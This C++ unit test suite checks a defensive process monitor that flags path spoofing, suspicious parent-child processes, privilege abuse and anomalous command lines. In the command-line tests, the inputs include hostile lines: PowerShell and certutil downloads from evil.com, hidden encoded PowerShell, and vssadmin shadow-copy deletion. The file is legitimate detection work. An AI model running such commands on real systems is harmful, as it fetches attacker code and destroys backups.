#include "finguard/hal/mock_collector.hpp"
#include "finguard/monitors/process_monitor.hpp"
#include <iostream>
#include <cassert>
#include <chrono>

#define TEST_ASSERT(cond, msg) \
    do { \
        if (!(cond)) { \
            std::cerr << "\033[1;31m[FAILED]\033[0m " << msg << " (" << __FILE__ << ":" << __LINE__ << ")\n"; \
            return 1; \
        } \
    } while (0)

int test_process_enumeration() {
    auto collector = std::make_shared<finguard::hal::MockCollector>();
    auto procs = collector->enumerate_processes();
    TEST_ASSERT(!procs.empty(), "Process list should not be empty");
    TEST_ASSERT(procs.size() >= 10, "Default scenario must have at least 10 baseline & threat processes");
    std::cout << "\033[1;32m[PASSED]\033[0m test_process_enumeration (found " << procs.size() << " processes)\n";
    return 0;
}

int test_path_spoofing() {
    auto collector = std::make_shared<finguard::hal::MockCollector>();
    finguard::monitors::ProcessMonitor monitor(collector);

    // Test legitimate svchost
    TEST_ASSERT(!finguard::monitors::ProcessMonitor::is_path_spoofing("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
                "Legitimate System32 svchost must not be flagged");
    TEST_ASSERT(!finguard::monitors::ProcessMonitor::is_path_spoofing("svchost.exe", "c:\\windows\\system32\\svchost.exe"),
                "Case-insensitive matching must accept lowercase c:\\windows\\system32\\svchost.exe");
    TEST_ASSERT(!finguard::monitors::ProcessMonitor::is_path_spoofing("explorer.exe", "C:\\Windows\\explorer.exe"),
                "Legitimate explorer.exe must not be flagged");

    // Test impostor svchost
    TEST_ASSERT(finguard::monitors::ProcessMonitor::is_path_spoofing("svchost.exe", "C:\\Users\\Victim\\AppData\\Roaming\\svchost.exe"),
                "Impostor svchost running from AppData must be flagged as path spoofing");
    TEST_ASSERT(finguard::monitors::ProcessMonitor::is_path_spoofing("lsass.exe", "C:\\Temp\\lsass.exe"),
                "Impostor lsass in C:\\Temp must be flagged");

    std::cout << "\033[1;32m[PASSED]\033[0m test_path_spoofing\n";
    return 0;
}

int test_suspicious_parent_child() {
    TEST_ASSERT(finguard::monitors::ProcessMonitor::is_suspicious_parent("WINWORD.EXE", "powershell.exe"),
                "Word spawning PowerShell must be flagged");
    TEST_ASSERT(finguard::monitors::ProcessMonitor::is_suspicious_parent("excel.exe", "cmd.exe"),
                "Excel spawning cmd must be flagged");
    TEST_ASSERT(finguard::monitors::ProcessMonitor::is_suspicious_parent("chrome.exe", "powershell.exe"),
                "Browser spawning PowerShell must be flagged");
    TEST_ASSERT(!finguard::monitors::ProcessMonitor::is_suspicious_parent("services.exe", "svchost.exe"),
                "services.exe spawning svchost.exe is legitimate and must not be flagged");
    TEST_ASSERT(!finguard::monitors::ProcessMonitor::is_suspicious_parent("explorer.exe", "chrome.exe"),
                "explorer spawning chrome is legitimate");

    std::cout << "\033[1;32m[PASSED]\033[0m test_suspicious_parent_child\n";
    return 0;
}

int test_command_line_anomalies() {
    TEST_ASSERT(finguard::monitors::ProcessMonitor::has_suspicious_command_line(
                    "powershell.exe", "powershell.exe -w hidden -enc JABzAD0ATgBlAHc..."),
                "Hidden Base64 encoded PowerShell must be flagged");
    TEST_ASSERT(finguard::monitors::ProcessMonitor::has_suspicious_command_line(
                    "powershell.exe", "powershell.exe (New-Object Net.WebClient).DownloadString('http://evil.com')"),
                "PowerShell WebClient download must be flagged");
    TEST_ASSERT(finguard::monitors::ProcessMonitor::has_suspicious_command_line(
                    "certutil.exe", "certutil -urlcache -split -f http://evil.com/x.exe out.exe"),
                "Certutil urlcache download must be flagged");
    TEST_ASSERT(finguard::monitors::ProcessMonitor::has_suspicious_command_line(
                    "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
                "Vssadmin shadow deletion must be flagged");
    TEST_ASSERT(!finguard::monitors::ProcessMonitor::has_suspicious_command_line(
                    "chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default"),
                "Standard Chrome flags must not be flagged");

    std::cout << "\033[1;32m[PASSED]\033[0m test_command_line_anomalies\n";
    return 0;
}

int test_privilege_anomalies() {
    auto collector = std::make_shared<finguard::hal::MockCollector>();
    finguard::monitors::ProcessMonitor monitor(collector);

    auto report = monitor.scan_and_analyze();
    bool found_privilege_abuse = false;
    bool legit_lsass_flagged = false;

    for (const auto& a : report.anomalies) {
        if (a.category == finguard::AnomalyCategory::PrivilegeAbuse) {
            if (a.pid == 6200 && a.process_name == "untrusted_injector.exe") {
                found_privilege_abuse = true;
            }
            if (a.process_name == "lsass.exe") {
                legit_lsass_flagged = true;
            }
        }
    }

    TEST_ASSERT(found_privilege_abuse, "Non-system untrusted_injector.exe with SeDebugPrivilege must trigger PrivilegeAbuse");
    TEST_ASSERT(!legit_lsass_flagged, "Legitimate lsass.exe must NOT be flagged for SeDebugPrivilege");

    std::cout << "\033[1;32m[PASSED]\033[0m test_privilege_anomalies\n";
    return 0;
}

int test_full_scan_report_and_performance() {
    auto collector = std::make_shared<finguard::hal::MockCollector>();
    finguard::monitors::ProcessMonitor monitor(collector);

    auto report = monitor.scan_and_analyze();

    TEST_ASSERT(report.total_processes_scanned >= 10, "Total processes should be >= 10");
    TEST_ASSERT(!report.anomalies.empty(), "Should identify anomalies in test scenario");
    TEST_ASSERT(report.scan_duration_us.count() < 50000, "Scan must complete in under 50ms (< 50,000 us)");

    // Count specific threat categories found
    int path_spoofing_count = 0;
    int parent_child_count = 0;
    int cmd_line_count = 0;
    int priv_abuse_count = 0;

    for (const auto& a : report.anomalies) {
        if (a.category == finguard::AnomalyCategory::PathSpoofing) path_spoofing_count++;
        else if (a.category == finguard::AnomalyCategory::SuspiciousParentChild) parent_child_count++;
        else if (a.category == finguard::AnomalyCategory::SuspiciousCommandLine) cmd_line_count++;
        else if (a.category == finguard::AnomalyCategory::PrivilegeAbuse) priv_abuse_count++;
    }

    TEST_ASSERT(path_spoofing_count >= 1, "Must detect at least 1 path spoofing incident");
    TEST_ASSERT(parent_child_count >= 1, "Must detect at least 1 suspicious parent-child incident");
    TEST_ASSERT(cmd_line_count >= 2, "Must detect at least 2 suspicious command line incidents (PowerShell & Certutil)");
    TEST_ASSERT(priv_abuse_count >= 1, "Must detect at least 1 privilege abuse incident");

    std::cout << "\033[1;32m[PASSED]\033[0m test_full_scan_report_and_performance (duration: "
              << report.scan_duration_us.count() << " us / "
              << (report.scan_duration_us.count() / 1000.0) << " ms)\n";
    return 0;
}

int main() {
    std::cout << "\n=== Running FinGuard Process Monitor Test Suite ===\n";
    int failed = 0;
    failed += test_process_enumeration();
    failed += test_path_spoofing();
    failed += test_suspicious_parent_child();
    failed += test_command_line_anomalies();
    failed += test_privilege_anomalies();
    failed += test_full_scan_report_and_performance();

    if (failed == 0) {
        std::cout << "\033[1;32m=== ALL 6 UNIT TESTS PASSED SUCCESSFULLY! ===\033[0m\n\n";
        return 0;
    } else {
        std::cerr << "\033[1;31m=== " << failed << " TESTS FAILED! ===\033[0m\n\n";
        return 1;
    }
}
